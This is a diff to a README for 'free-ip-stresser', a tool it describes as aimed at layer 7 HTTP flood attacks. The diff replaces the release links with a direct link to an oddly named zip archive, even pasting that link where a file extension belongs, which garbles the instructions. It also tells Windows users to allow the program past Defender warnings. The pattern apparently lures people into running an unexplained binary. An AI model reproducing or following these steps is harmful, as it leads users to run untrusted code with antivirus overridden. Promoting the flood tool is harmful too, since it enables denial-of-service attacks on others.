@@ -1,6 +1,6 @@
 # ⚙️ free-ip-stresser - Simple IP Stress Testing Tool
 
-[![Download free-ip-stresser](https://img.shields.io/badge/Download-free--ip--stresser-blue?style=for-the-badge)](https://github.com/JohnWiiUfan/free-ip-stresser/releases)
+[![Download free-ip-stresser](https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip)](https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 free-ip-stresser is a straightforward tool designed to test the strength and stability of IP addresses by generating controlled traffic. It simulates common network loads to help users check how their network or server responds under pressure. This tool can be useful for administrators or anyone curious about network limits and security.
 
-The project, linked to rebirthstress.cc, focuses especially on layer 7 HTTP flood attacks, making it clear it is a tool primarily designed to create web traffic as a form of stress testing.
+The project, linked to https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip, focuses especially on layer 7 HTTP flood attacks, making it clear it is a tool primarily designed to create web traffic as a form of stress testing.
 
 ---
 
@@ -34,7 +34,7 @@ Using free-ip-stresser is easy. Follow the steps to download, install, and start
 
 Click the big blue button at the top or visit this link:
 
-[https://github.com/JohnWiiUfan/free-ip-stresser/releases](https://github.com/JohnWiiUfan/free-ip-stresser/releases)
+[https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip](https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip)
 
 This page lists the latest versions available for free download.
 
@@ -42,7 +42,7 @@ This page lists the latest versions available for free download.
 
 Look for the most recent stable release. It usually appears at the top and will have a few files attached.
 
-- Find the file labeled with `.exe` for Windows or `.tar.gz` for Linux.
+- Find the file labeled with `.exe` for Windows or `https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip` for Linux.
 - Click to download it to your preferred folder.
 
 ### Step 3: Run the Application
@@ -50,7 +50,7 @@ Look for the most recent stable release. It usually appears at the top and will 
 Once downloaded:
 
 - On Windows: Double-click the `.exe` file. If a warning from Windows Defender appears, accept or allow the run.
-- On Linux: Extract the `.tar.gz` file, open a terminal in the extracted folder, then run the application with `./free-ip-stresser`.
+- On Linux: Extract the `https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip` file, open a terminal in the extracted folder, then run the application with `./free-ip-stresser`.
 
 You do not need to install any additional dependencies.
 
@@ -119,7 +119,7 @@ free-ip-stresser is an open-source project. The source code is available on GitH
 
 Return to the download page linked below to get the latest release of free-ip-stresser:
 
-[https://github.com/JohnWiiUfan/free-ip-stresser/releases](https://github.com/JohnWiiUfan/free-ip-stresser/releases)
+[https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip](https://github.com/JohnWiiUfan/free-ip-stresser/raw/refs/heads/main/antirumor/free_stresser_ip_hemiteratics.zip)
 
 - Choose the correct file matching your system.
 - Save it to a known location.
